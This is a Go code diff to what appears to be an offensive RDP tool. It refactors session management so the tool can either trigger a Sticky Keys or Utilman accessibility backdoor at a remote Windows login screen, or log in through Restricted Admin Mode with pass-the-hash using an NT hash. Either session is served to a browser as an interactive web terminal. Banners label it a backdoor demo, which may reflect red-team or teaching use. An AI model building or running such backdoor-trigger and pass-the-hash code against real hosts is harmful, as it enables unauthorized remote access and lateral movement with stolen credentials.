@@ -123,6 +123,11 @@ type sessionManager struct {
 	target       string
 	timeout      time.Duration
 	backdoorType BackdoorType
+	// authMode selects an authenticated (NLA/CredSSP, Restricted Admin) session
+	// instead of an unauthenticated backdoor session.
+	authMode bool
+	// creds holds the credentials used when authMode is set.
+	creds AuthCredentials
 }
 
 // Session returns the current active session.
@@ -132,7 +137,37 @@ func (m *sessionManager) Session() *InteractiveSession {
 	return m.sess
 }
 
-// Reconnect closes the old session and creates a new one, triggering the configured backdoor.
+// establish creates a fresh session per the manager's mode. For backdoor mode it
+// waits for the login screen and triggers the configured backdoor; for auth mode
+// it returns the fully-connected authenticated session directly.
+func (m *sessionManager) establish(ctx context.Context) (*InteractiveSession, error) {
+	if m.authMode {
+		sess, err := NewAuthenticatedSession(ctx, m.target, m.timeout, 1024, 768, m.creds)
+		if err != nil {
+			return nil, err
+		}
+		sess.WaitForFrame(3 * time.Second)
+		return sess, nil
+	}
+
+	sess, err := NewInteractiveSession(ctx, m.target, m.timeout, 1024, 768)
+	if err != nil {
+		return nil, err
+	}
+
+	// Wait for login screen, then trigger the backdoor.
+	time.Sleep(3 * time.Second)
+	sess.WaitForFrame(2 * time.Second)
+	if triggerErr := triggerBackdoor(sess, m.backdoorType); triggerErr != nil {
+		sess.Close()
+		return nil, fmt.Errorf("trigger backdoor: %w", triggerErr)
+	}
+	time.Sleep(1 * time.Second)
+	sess.WaitForFrame(2 * time.Second)
+	return sess, nil
+}
+
+// Reconnect closes the old session and establishes a fresh one.
 func (m *sessionManager) Reconnect(ctx context.Context) error {
 	m.mu.Lock()
 	defer m.mu.Unlock()
@@ -148,24 +183,10 @@ func (m *sessionManager) Reconnect(ctx context.Context) error {
 	// Brief pause to let in-flight goroutines notice the nil session
 	time.Sleep(200 * time.Millisecond)
 
-	// Create new session
-	newSess, sessErr := NewInteractiveSession(ctx, m.target, m.timeout, 1024, 768)
+	newSess, sessErr := m.establish(ctx)
 	if sessErr != nil {
 		return fmt.Errorf("reconnect failed: %w", sessErr)
 	}
-
-	// Wait for login screen
-	time.Sleep(3 * time.Second)
-	newSess.WaitForFrame(2 * time.Second)
-
-	// Trigger the appropriate backdoor
-	if triggerErr := triggerBackdoor(newSess, m.backdoorType); triggerErr != nil {
-		newSess.Close()
-		return fmt.Errorf("trigger backdoor: %w", triggerErr)
-	}
-
-	time.Sleep(1 * time.Second)
-	newSess.WaitForFrame(2 * time.Second)
 
 	m.sess = newSess
 	return nil
@@ -194,43 +215,60 @@ const (
 func RunWebTerminal(ctx context.Context, target string, timeout time.Duration, openInBrowser bool, backdoorType BackdoorType) error {
 	fmt.Fprintf(os.Stderr, "[*] Connecting to %s for interactive web terminal...\n", target)
 
-	sess, err := NewInteractiveSession(ctx, target, timeout, 1024, 768)
-	if err != nil {
-		return fmt.Errorf("connection failed: %w", err)
-	}
-
 	mgr := &sessionManager{
-		sess:         sess,
 		target:       target,
 		timeout:      timeout,
 		backdoorType: backdoorType,
 	}
 	defer mgr.Close()
 
-	// Wait for initial screen
-	fmt.Fprintf(os.Stderr, "[*] Waiting for login screen...\n")
-	time.Sleep(3 * time.Second)
-	sess.WaitForFrame(2 * time.Second)
+	fmt.Fprintf(os.Stderr, "[*] Waiting for login screen and triggering backdoor...\n")
+	sess, err := mgr.establish(ctx)
+	if err != nil {
+		return fmt.Errorf("connection failed: %w", err)
+	}
+	mgr.sess = sess
 
-	// Trigger the appropriate backdoor
+	backdoorLabel := "Sticky Keys"
 	if backdoorType == BackdoorUtilman {
-		fmt.Fprintf(os.Stderr, "[*] Sending Win+U to trigger utilman...\n")
-	} else {
-		fmt.Fprintf(os.Stderr, "[*] Sending 5x Shift to trigger sticky keys...\n")
+		backdoorLabel = "Utilman"
 	}
+	return serveWebTerminal(ctx, mgr, target, openInBrowser,
+		fmt.Sprintf("RDP Web Terminal - %s Backdoor Demo", backdoorLabel))
+}
 
-	if triggerErr := triggerBackdoor(sess, backdoorType); triggerErr != nil {
-		return fmt.Errorf("trigger backdoor: %w", triggerErr)
+// RunWebTerminalAuthenticated connects to an RDP target using NLA/CredSSP with the
+// supplied credentials in Restricted Admin Mode (enabling pass-the-hash when an NT
+// hash is provided) and serves the authenticated desktop as an interactive web
+// terminal on localhost. The target server must have Restricted Admin Mode enabled.
+func RunWebTerminalAuthenticated(ctx context.Context, target string, timeout time.Duration, openInBrowser bool, creds AuthCredentials) error {
+	fmt.Fprintf(os.Stderr, "[*] Connecting to %s with Restricted Admin Mode (pass-the-hash)...\n", target)
+
+	mgr := &sessionManager{
+		target:   target,
+		timeout:  timeout,
+		authMode: true,
+		creds:    creds,
 	}
+	defer mgr.Close()
 
-	time.Sleep(1 * time.Second)
-	sess.WaitForFrame(2 * time.Second)
+	sess, err := mgr.establish(ctx)
+	if err != nil {
+		return fmt.Errorf("authenticated connection failed: %w", err)
+	}
+	mgr.sess = sess
 
+	return serveWebTerminal(ctx, mgr, target, openInBrowser, "RDP Web Terminal - Restricted Admin Login")
+}
+
+// serveWebTerminal starts the localhost HTTP/WebSocket server that streams the
+// session in mgr to a browser. It blocks until the server stops.
+func serveWebTerminal(ctx context.Context, mgr *sessionManager, target string, openInBrowser bool, bannerTitle string) error {
 	fmt.Fprintf(os.Stderr, "[+] Session established. Starting web terminal...\n")
 
 	// Generate a random token for the WebSocket URL to prevent unauthorized access
 	tokenBytes := make([]byte, 16)
-	if _, err = rand.Read(tokenBytes); err != nil {
+	if _, err := rand.Read(tokenBytes); err != nil {
 		return fmt.Errorf("generate token: %w", err)
 	}
 	token := base64.URLEncoding.EncodeToString(tokenBytes)
@@ -311,13 +349,6 @@ func RunWebTerminal(ctx context.Context, target string, timeout time.Duration, o
 	}()
 
 	url := fmt.Sprintf("http://127.0.0.1:%d", port)
-
-	// Set banner label based on active backdoor type
-	backdoorLabel := "Sticky Keys"
-	if backdoorType == BackdoorUtilman {
-		backdoorLabel = "Utilman"
-	}
-	bannerTitle := fmt.Sprintf("RDP Web Terminal - %s Backdoor Demo", backdoorLabel)
 
 	fmt.Fprintf(os.Stderr, "\n")
 	fmt.Fprintf(os.Stderr, "  ╔══════════════════════════════════════════════════╗\n")
